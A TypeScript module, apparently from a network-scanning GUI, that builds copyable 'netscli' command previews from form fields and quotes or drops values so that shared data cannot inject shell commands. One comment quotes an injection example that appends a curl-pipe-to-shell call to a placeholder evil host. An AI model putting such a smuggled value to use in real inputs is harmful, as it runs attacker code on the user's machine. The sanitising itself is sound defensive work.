import { scanRequest } from '../scanRequest';
import type { WorkspaceTab } from '../types';

/** Characters that never need quoting in any shell. */
const PLAIN = /^[\w@+=:,./-]+$/;

/**
 * Characters that cannot be quoted safely for every shell this might be pasted
 * into. `$` and the backtick expand inside double quotes in bash and
 * PowerShell, a `"` ends the string in all of them, `%` and `!` expand in cmd
 * and bash, and a trailing backslash escapes the closing quote.
 */
const UNQUOTABLE = /[$`"%!\p{Cc}]|\\$/u;

/**
 * A form value as one argument of the copied command, or '' when it cannot be
 * made one.
 *
 * The command is shown in the strip and copied from it, and every value in it
 * comes from the form, which a shared result bundle can fill with anything. A
 * host of `1.1.1.1; curl https://evil.example | sh` used to be one click from
 * the clipboard as a working command. Now it comes out as a single quoted
 * argument, and a value that cannot be quoted is left out like an empty one,
 * so the command that is shown never contains anything a shell would act on.
 */
function arg(raw: string | undefined): string {
  const value = raw?.trim() ?? '';
  if (PLAIN.test(value)) return value;
  if (!value || UNQUOTABLE.test(value)) return '';
  return `"${value}"`;
}

/** ` --name value`, or nothing when there is no value to pass. */
function flag(name: string, raw: string | undefined): string {
  const value = arg(raw);
  return value ? ` ${name} ${value}` : '';
}

export function buildCommand(tab: WorkspaceTab): string {
  const form = tab.form;
  switch (tab.kind) {
    case 'scan':
      // `-p` is omitted when the field is empty, exactly as `inspect` and
      // `sweep` below already do. It used to substitute the GUI's
      // DEFAULT_PORTS placeholder (22,80,443,8080,8443) while execution sent
      // no port list at all and the core fell back to its own default of
      // 22,80,443 — so the preview claimed five ports, three were scanned,
      // and that wrong string was what Ctrl+Shift+C copied, what the History
      // menu recorded, and what got stored with the saved result.
    {
      const { ports, udp } = scanRequest(form);
      return `netscli scan ${arg(form.host) || '<host>'}${flag('-p', ports)}${udp ? ' --udp' : ''} --json`;
    }
    case 'ping':
      return `netscli ping ${arg(form.host) || '<host>'}${flag('--count', form.count)} --json`;
    case 'trace': {
      const resolve = form.resolve === 'On' ? ' --resolve' : '';
      return `netscli trace ${arg(form.host) || '<host>'}${flag('--max-hops', form.max_hops)}${resolve} --json`;
    }
    case 'discover': {
      const subnet = arg(form.subnet);
      return `netscli discover${subnet ? ` ${subnet}` : ''} --resolve --json`;
    }
    case 'dns': {
      const record = flag('--record', form.record === 'ALL' ? '' : form.record);
      return `netscli dns ${arg(form.host) || '<host>'}${record} --json`;
    }
    case 'reverse':
      return `netscli reverse ${arg(form.ip) || '<ip>'} --json`;
    case 'inspect':
      return `netscli inspect ${arg(form.host) || '<host>'}${flag('-p', form.ports)} --json`;
    case 'sweep': {
      const subnet = arg(form.subnet);
      return `netscli sweep${subnet ? ` ${subnet}` : ''}${flag('-p', form.ports)} --resolve --json`;
    }
    case 'mdns': {
      const types = form.service_types
        ?.split(',')
        .map((item) => flag('--type', item))
        .join('') ?? '';
      const timeout = form.timeout_ms !== '3000' ? flag('--timeout-ms', form.timeout_ms) : '';
      return `netscli mdns${timeout}${types} --json`;
    }
    case 'interfaces':
      return 'netscli interfaces --json';
    case 'arp':
      return 'netscli arp --json';
    case 'pcap': {
      if (form.mode === 'Open File') {
        return `netscli pcap --read <file>${flag('--max-packets', form.max_packets)} --json`;
      }
      // The capture branch omitted --json while every other command here
      // includes it, so this one preview did not match what the app runs.
      return `netscli pcap${flag('--interface', form.interface)}${flag('--duration', form.duration)}${flag('--filter', form.filter)}${flag('--max-packets', form.max_packets)} --json`;
    }
  }
}
